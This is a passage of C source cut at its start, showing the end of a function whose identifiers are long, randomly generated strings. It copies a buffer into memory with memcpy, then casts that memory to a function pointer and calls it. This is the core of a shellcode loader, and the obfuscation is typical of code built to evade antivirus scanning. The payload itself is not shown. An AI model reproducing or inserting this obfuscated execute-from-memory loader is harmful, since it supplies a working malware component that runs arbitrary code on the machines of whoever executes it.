            memcpy(f1gOiqvhiiO0NKWMKiHqt4crZR5WSzwb_arLeTj5dGxc05vMu1Amc_aTfPIOsf46Vp5G_GVHdecYV1pyhk9UPNHA3ZlNVvkM02Xu3UTPVSpcSvNkMBYBQZvbyT22efGjFybQOESl8C8jKIBA4VJyLEj0n30hk64innQ2leXbcN_9sCqG9LETwP3mehZ8_Avm3ntrNWNXGq9ANnPSxwfnGe5x9LYDMnIM7dt8N, AumJ9rf_td8fjQo, ZaJ5EzPKr3mnPSvcJYOz8EBGJHJiQdvWZClv4KpwOmDvc54EZcWU4y5UcB05OzkmrrBylvckJJyRD6QXWyNvv1rbHqjrTI_Ob4fCGQlHWooJf7HA9BAPAXcXFsyRwIXyE0Uqskw1DIN6f95JsgTwSGnJ1fvyZ9Qj8V21rG7Rr0CwpxYubdIYJhlHAdaxsM6LpVNfXHtiiEgW05kNM);
            
            ((void(*)())(f1gOiqvhiiO0NKWMKiHqt4crZR5WSzwb_arLeTj5dGxc05vMu1Amc_aTfPIOsf46Vp5G_GVHdecYV1pyhk9UPNHA3ZlNVvkM02Xu3UTPVSpcSvNkMBYBQZvbyT22efGjFybQOESl8C8jKIBA4VJyLEj0n30hk64innQ2leXbcN_9sCqG9LETwP3mehZ8_Avm3ntrNWNXGq9ANnPSxwfnGe5x9LYDMnIM7dt8N))();
        } else {
            
        }
    } else {
        
    }
    
    return 0;
}